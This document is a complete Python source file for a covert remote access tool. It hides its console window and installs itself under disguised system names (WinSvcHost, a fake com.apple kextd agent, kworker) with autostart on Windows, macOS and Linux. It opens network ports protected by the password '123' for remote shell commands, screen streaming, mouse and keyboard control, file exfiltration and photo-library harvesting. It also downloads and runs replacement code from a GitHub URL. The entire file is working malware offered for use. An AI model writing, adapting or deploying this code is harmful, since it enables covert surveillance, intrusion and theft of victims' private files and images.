import sys, os, subprocess, platform, threading, time, socket, json, io, struct

def pip_install(*pkgs):
    for pkg in pkgs:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg, "--quiet",
                 "--upgrade", "--break-system-packages"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60
            )
        except:
            pass

def check_import(name):
    try: __import__(name); return True
    except ImportError: return False

if not check_import("PIL"):       pip_install("pillow")
if not check_import("pyautogui"): pip_install("pyautogui")
if not check_import("PIL"):       pip_install("Pillow==9.5.0")
if not check_import("pyautogui"): pip_install("pyautogui==0.9.54")
if platform.system() == "Windows":
    for dep in ["pygetwindow", "pyscreeze", "mouseinfo"]:
        if not check_import(dep): pip_install(dep)

if platform.system() == "Windows":
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    PYAUTOGUI_OK = True
except:
    PYAUTOGUI_OK = False

try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except:
    PIL_OK = False

HOST         = "0.0.0.0"
COMMAND_PORT = 9000
SCREEN_PORT  = 9001
PASSWORD     = "123"
VERSION      = "1.0"

GITHUB_RAW_VERSION = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/version.txt"
GITHUB_RAW_SCRIPT  = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/WinSvcHost.py"
UPDATE_INTERVAL    = 3600

def check_update():
    while True:
        try:
            time.sleep(UPDATE_INTERVAL)
            import urllib.request
            with urllib.request.urlopen(GITHUB_RAW_VERSION, timeout=10) as r:
                remote_version = r.read().decode().strip()
            if remote_version != VERSION:
                with urllib.request.urlopen(GITHUB_RAW_SCRIPT, timeout=30) as r:
                    new_code = r.read()
                current_file = os.path.abspath(__file__)
                tmp = current_file + ".tmp"
                with open(tmp, "wb") as f:
                    f.write(new_code)
                os.replace(tmp, current_file)
                subprocess.Popen(
                    [sys.executable, current_file],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=0x00000008 if platform.system() == "Windows" else 0
                )
                os._exit(0)
        except:
            pass

def get_screen_size():
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
            w = ctypes.windll.user32.GetSystemMetrics(0)
            h = ctypes.windll.user32.GetSystemMetrics(1)
            return w, h
    except:
        pass
    try:
        return pyautogui.size()
    except:
        return 1920, 1080

def setup():
    if platform.system() == "Windows":
        try:
            import winreg, shutil
            appdata   = os.environ.get("APPDATA", os.path.expanduser("~"))
            dest_dir  = os.path.join(appdata, "Microsoft", "Windows", "WinSvcHost")
            os.makedirs(dest_dir, exist_ok=True)
            dest_file = os.path.join(dest_dir, "WinSvcHost.py")
            current   = os.path.abspath(__file__)

            if os.path.normcase(current) != os.path.normcase(dest_file):
                shutil.copy2(current, dest_file)

                vbs_path = os.path.join(dest_dir, "WinSvcHost.vbs")
                pythonw  = sys.executable.replace("python.exe", "pythonw.exe")
                if not os.path.exists(pythonw):
                    pythonw = sys.executable
                with open(vbs_path, "w") as f:
                    f.write(f'CreateObject("WScript.Shell").Run """{ pythonw }""" """{ dest_file }""", 0, False\n')

            exe = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(exe):
                exe = sys.executable
            cmd = f'"{exe}" "{dest_file}"'
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WinSvcHost", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except:
            pass
    elif platform.system() == "Darwin":
        try:
            import shutil
            home      = os.path.expanduser("~")
            dest_dir  = os.path.join(home, "Library", "Application Support", "com.apple.system.cache", "kextd")
            os.makedirs(dest_dir, exist_ok=True)
            dest_file = os.path.join(dest_dir, "kextd_helper.py")
            current   = os.path.abspath(__file__)
            if os.path.normcase(current) != os.path.normcase(dest_file):
                shutil.copy2(current, dest_file)
            plist_dir  = os.path.join(home, "Library", "LaunchAgents")
            os.makedirs(plist_dir, exist_ok=True)
            plist_path = os.path.join(plist_dir, "com.apple.system.kextd.plist")
            if not os.path.exists(plist_path):
                plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.kextd</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{dest_file}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                with open(plist_path, "w") as f:
                    f.write(plist)
                subprocess.run(["launchctl", "load", plist_path],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    elif platform.system() == "Linux":
        try:
            import shutil
            home      = os.path.expanduser("~")
            dest_dir  = os.path.join(home, ".local", "share", "systemd", "kworker")
            os.makedirs(dest_dir, exist_ok=True)
            dest_file = os.path.join(dest_dir, "kworker.py")
            current   = os.path.abspath(__file__)
            if current != dest_file:
                shutil.copy2(current, dest_file)
            line = f"@reboot {sys.executable} {dest_file} &\n"
            r    = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if dest_file not in r.stdout:
                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                p.communicate((r.stdout + line).encode())
        except:
            pass

setup()

def handle_cmd(conn, addr):
    try:
        if conn.recv(1024).decode(errors="ignore").strip() != PASSWORD:
            conn.send(b"AUTH_FAIL"); conn.close(); return
        conn.send(b"AUTH_OK")

        sw, sh = get_screen_size()
        conn.send(json.dumps({"screen_w": sw, "screen_h": sh}).encode())
        conn.recv(16)

        while True:
            try:
                data = conn.recv(4096)
            except:
                break
            if not data: break
            try:
                cmd = json.loads(data.decode(errors="ignore"))
            except:
                continue
            action = cmd.get("action", "")
            res    = {"status": "ok", "result": ""}
            try:
                if   action == "mouse_move"   and PYAUTOGUI_OK: pyautogui.moveTo(cmd["x"], cmd["y"])
                elif action == "mouse_click"  and PYAUTOGUI_OK:
                    (pyautogui.doubleClick if cmd.get("double") else pyautogui.click)(
                        cmd["x"], cmd["y"], button=cmd.get("button", "left"))
                elif action == "mouse_scroll" and PYAUTOGUI_OK: pyautogui.scroll(cmd.get("dy", 0), x=cmd["x"], y=cmd["y"])
                elif action == "type"         and PYAUTOGUI_OK: pyautogui.typewrite(cmd.get("text", ""), interval=0.02)
                elif action == "hotkey"       and PYAUTOGUI_OK: pyautogui.hotkey(*cmd.get("keys", []))
                elif action == "keypress"     and PYAUTOGUI_OK: pyautogui.press(cmd.get("key", ""))
                elif action == "shell":
                    try:
                        r = subprocess.run(cmd.get("command", ""), shell=True,
                                           capture_output=True, text=True, timeout=15)
                        res["result"] = (r.stdout + r.stderr)[:2000]
                    except subprocess.TimeoutExpired: res["result"] = "[Timeout]"
                    except Exception as e:            res["result"] = str(e)
                elif action == "uninstall":
                    def do_uninstall():
                        try:
                            time.sleep(1)
                            if platform.system() == "Windows":
                                import winreg, shutil
                                try:
                                    key = winreg.OpenKey(
                                        winreg.HKEY_CURRENT_USER,
                                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                                        0, winreg.KEY_SET_VALUE)
                                    winreg.DeleteValue(key, "WinSvcHost")
                                    winreg.CloseKey(key)
                                except: pass
                                dest = os.path.join(
                                    os.environ.get("APPDATA",""),
                                    "Microsoft","Windows","WinSvcHost")
                                try: shutil.rmtree(dest, ignore_errors=True)
                                except: pass
                            elif platform.system() == "Darwin":
                                import shutil
                                plist = os.path.expanduser(
                                    "~/Library/LaunchAgents/com.apple.system.kextd.plist")
                                try:
                                    subprocess.run(["launchctl","unload",plist],
                                                   stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL)
                                    os.remove(plist)
                                except: pass
                                dest = os.path.expanduser(
                                    "~/Library/Application Support/com.apple.system.cache/kextd")
                                try: shutil.rmtree(dest, ignore_errors=True)
                                except: pass
                            elif platform.system() == "Linux":
                                import shutil
                                dest = os.path.expanduser("~/.local/share/systemd/kworker")
                                try: shutil.rmtree(dest, ignore_errors=True)
                                except: pass
                                try:
                                    r = subprocess.run(["crontab","-l"],
                                                       capture_output=True, text=True)
                                    lines = [l for l in r.stdout.splitlines()
                                             if "kworker" not in l]
                                    p = subprocess.Popen(["crontab","-"], stdin=subprocess.PIPE)
                                    p.communicate("\n".join(lines).encode())
                                except: pass
                            os._exit(0)
                        except:
                            os._exit(0)
                    res["result"] = "Desinstalando..."
                    threading.Thread(target=do_uninstall, daemon=True).start()
                elif action == "force_update":
                    def do_update():
                        try:
                            import urllib.request
                            with urllib.request.urlopen(GITHUB_RAW_VERSION, timeout=10) as r:
                                remote_version = r.read().decode().strip()
                            if remote_version != VERSION:
                                with urllib.request.urlopen(GITHUB_RAW_SCRIPT, timeout=30) as r:
                                    new_code = r.read()
                                current_file = os.path.abspath(__file__)
                                tmp = current_file + ".tmp"
                                with open(tmp, "wb") as f:
                                    f.write(new_code)
                                os.replace(tmp, current_file)
                                subprocess.Popen(
                                    [sys.executable, current_file],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    creationflags=0x00000008 if platform.system() == "Windows" else 0
                                )
                                os._exit(0)
                                res["result"] = f"Actualizado a {remote_version}"
                            else:
                                res["result"] = f"Ya tiene la version mas reciente ({VERSION})"
                        except Exception as e:
                            res["result"] = f"Error: {e}"
                    import urllib.request
                    try:
                        with urllib.request.urlopen(GITHUB_RAW_VERSION, timeout=10) as r:
                            remote_version = r.read().decode().strip()
                        if remote_version != VERSION:
                            res["result"] = f"Actualizando a {remote_version}..."
                            threading.Thread(target=do_update, daemon=True).start()
                        else:
                            res["result"] = f"Ya tiene la version mas reciente ({VERSION})"
                    except Exception as e:
                        res["result"] = f"Error al verificar: {e}"
                elif action == "sysinfo":
                    res["result"] = json.dumps({
                        "os": platform.system(), "version": platform.version(),
                        "machine": platform.machine(), "processor": platform.processor(),
                        "hostname": socket.gethostname(),
                        "screen_w": sw, "screen_h": sh
                    })
                elif action == "ls":
                    path = cmd.get("path", os.path.expanduser("~"))
                    try:
                        items = []
                        for entry in os.scandir(path):
                            try:
                                stat = entry.stat()
                                items.append({
                                    "name": entry.name,
                                    "is_dir": entry.is_dir(),
                                    "size": stat.st_size,
                                    "modified": stat.st_mtime
                                })
                            except:
                                pass
                        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
                        res["result"] = json.dumps({"path": path, "items": items})
                    except Exception as e:
                        res["result"] = json.dumps({"path": path, "items": [], "error": str(e)})
                elif action == "roots":
                    roots = []
                    if platform.system() == "Windows":
                        import string
                        for d in string.ascii_uppercase:
                            p = d + ":\\"
                            if os.path.exists(p):
                                roots.append({"name": p, "is_dir": True, "size": 0, "modified": 0})
                    else:
                        roots = [
                            {"name": "/", "is_dir": True, "size": 0, "modified": 0},
                            {"name": os.path.expanduser("~"), "is_dir": True, "size": 0, "modified": 0},
                        ]
                        if platform.system() == "Darwin":
                            for d in ["/Volumes", os.path.expanduser("~/Pictures"),
                                      os.path.expanduser("~/Downloads"),
                                      os.path.expanduser("~/Desktop")]:
                                if os.path.exists(d):
                                    roots.append({"name": d, "is_dir": True, "size": 0, "modified": 0})
                    res["result"] = json.dumps({"items": roots, "path": ""})
                elif action == "read_file":
                    fpath = cmd.get("path", "")
                    try:
                        size = os.path.getsize(fpath)
                        if size > 100 * 1024 * 1024:
                            res["result"] = json.dumps({"error": "Archivo muy grande (>100MB)"})
                        else:
                            with open(fpath, "rb") as f:
                                import base64
                                data = f.read()
                                res["result"] = json.dumps({
                                    "name": os.path.basename(fpath),
                                    "data": base64.b64encode(data).decode(),
                                    "size": size
                                })
                    except Exception as e:
                        res["result"] = json.dumps({"error": str(e)})
                elif action == "thumbnail":
                    fpath = cmd.get("path", "")
                    size  = cmd.get("size", 120)
                    try:
                        import base64
                        img = Image.open(fpath)
                        img.thumbnail((size, size), Image.LANCZOS)
                        buf = io.BytesIO()
                        img.save(buf, format="JPEG", quality=60, optimize=True)
                        res["result"] = json.dumps({
                            "data": base64.b64encode(buf.getvalue()).decode(),
                            "w": img.width, "h": img.height
                        })
                    except Exception as e:
                        res["result"] = json.dumps({"error": str(e)})
                elif action == "photo_gallery":
                    path   = cmd.get("path", "")
                    offset = cmd.get("offset", 0)
                    limit  = cmd.get("limit", 50)
                    IMG_EXT = {".jpg",".jpeg",".png",".gif",".bmp",".webp",".heic",".tiff",".raw",".cr2",".nef"}
                    try:
                        all_imgs = []
                        for root_dir, dirs, files in os.walk(path):
                            dirs[:] = [d for d in dirs if not d.startswith(".")]
                            for f in files:
                                ext = os.path.splitext(f)[1].lower()
                                if ext in IMG_EXT:
                                    fp = os.path.join(root_dir, f)
                                    try:
                                        st = os.stat(fp)
                                        all_imgs.append({
                                            "name": f,
                                            "path": fp,
                                            "size": st.st_size,
                                            "modified": st.st_mtime
                                        })
                                    except: pass
                        all_imgs.sort(key=lambda x: x["modified"], reverse=True)
                        total  = len(all_imgs)
                        batch  = all_imgs[offset:offset+limit]
                        res["result"] = json.dumps({
                            "total": total,
                            "offset": offset,
                            "items": batch
                        })
                    except Exception as e:
                        res["result"] = json.dumps({"error": str(e), "total":0, "items":[]})
                elif action == "monitors":
                    try:
                        mons = []
                        if platform.system() == "Windows":
                            import ctypes
                            from ctypes import windll, wintypes
                            monitors = []
                            def cb(hm, hdc, rc, d):
                                monitors.append((rc.contents.left, rc.contents.top,
                                                 rc.contents.right, rc.contents.bottom))
                                return True
                            MONITORENUMPROC = ctypes.WINFUNCTYPE(
                                ctypes.c_bool, ctypes.c_ulong, ctypes.c_ulong,
                                ctypes.POINTER(wintypes.RECT), ctypes.c_double)
                            windll.user32.EnumDisplayMonitors(None, None, MONITORENUMPROC(cb), 0)
                            for i,(l,t,r,b) in enumerate(monitors):
                                mons.append({"id":i,"x":l,"y":t,"w":r-l,"h":b-t})
                        elif platform.system() == "Darwin":
                            r = subprocess.run(
                                ["system_profiler","SPDisplaysDataType","-json"],
                                capture_output=True, text=True, timeout=5)
                            mons = [{"id":0,"x":0,"y":0,"w":sw,"h":sh}]
                        else:
                            mons = [{"id":0,"x":0,"y":0,"w":sw,"h":sh}]
                        res["result"] = json.dumps({"monitors": mons})
                    except Exception as e:
                        res["result"] = json.dumps({"monitors":[{"id":0,"x":0,"y":0,"w":sw,"h":sh}]})
                elif action == "mac_photos":
                    try:
                        paths = []
                        home  = os.path.expanduser("~")
                        candidates = [
                            os.path.join(home, "Pictures"),
                            os.path.join(home, "Desktop"),
                            os.path.join(home, "Downloads"),
                            "/Volumes/Macintosh HD/Users",
                        ]
                        if platform.system() == "Darwin":
                            photos_lib = os.path.join(home, "Pictures", "Photos Library.photoslibrary")
                            if os.path.exists(photos_lib):
                                masters = os.path.join(photos_lib, "originals")
                                if not os.path.exists(masters):
                                    masters = os.path.join(photos_lib, "Masters")
                                if os.path.exists(masters):
                                    candidates.insert(0, masters)
                        for c in candidates:
                            if os.path.exists(c):
                                paths.append({"name": os.path.basename(c), "path": c, "is_dir": True, "size":0, "modified":0})
                        res["result"] = json.dumps({"items": paths, "path": ""})
                    except Exception as e:
                        res["result"] = json.dumps({"items":[], "error": str(e)})
            except Exception as e:
                res["result"] = str(e)
            try:
                conn.send(json.dumps(res).encode())
            except:
                break
    except:
        pass
    finally:
        try: conn.close()
        except: pass

def handle_screen(conn, addr):
    try:
        if conn.recv(1024).decode(errors="ignore").strip() != PASSWORD:
            conn.send(b"AUTH_FAIL"); conn.close(); return
        conn.send(b"AUTH_OK")

        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.shcore.SetProcessDpiAwareness(2)
            except:
                pass

        prev_data   = None
        monitor_box = None  # None = monitor principal

        while True:
            try:
                req = conn.recv(256)
                if not req: break
                req_s = req.strip().decode(errors="ignore")
                if req_s.startswith("MONITOR:"):
                    try:
                        mon = json.loads(req_s[8:])
                        monitor_box = (mon["x"], mon["y"], mon["x"]+mon["w"], mon["y"]+mon["h"])
                    except:
                        monitor_box = None
                    continue
                if req_s != "FRAME": continue
            except:
                break

            if PIL_OK:
                try:
                    if monitor_box:
                        s = ImageGrab.grab(bbox=monitor_box)
                    else:
                        s = ImageGrab.grab()
                    buf = io.BytesIO()
                    s.save(buf, format="JPEG", quality=70, optimize=True, subsampling=1)
                    d = buf.getvalue()
                    if d == prev_data:
                        conn.send(struct.pack(">I", 0))
                        continue
                    prev_data = d
                    conn.send(struct.pack(">I", len(d)))
                    conn.sendall(d)
                except:
                    try: conn.send(struct.pack(">I", 0))
                    except: break
            else:
                try: conn.send(struct.pack(">I", 0))
                except: break
    except:
        pass
    finally:
        try: conn.close()
        except: pass

def run_server(port, handler):
    while True:
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((HOST, port)); srv.listen(5)
            while True:
                try:
                    conn, addr = srv.accept()
                    threading.Thread(target=handler, args=(conn, addr), daemon=True).start()
                except:
                    break
            try: srv.close()
            except: pass
        except:
            pass
        time.sleep(3)

if __name__ == "__main__":
    try:
        _lock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _lock.bind(("127.0.0.1", 19876))
    except OSError:
        sys.exit(0)

    threading.Thread(target=run_server, args=(COMMAND_PORT, handle_cmd), daemon=True).start()
    threading.Thread(target=run_server, args=(SCREEN_PORT, handle_screen), daemon=True).start()
    threading.Thread(target=check_update, daemon=True).start()

    while True:
        time.sleep(60)
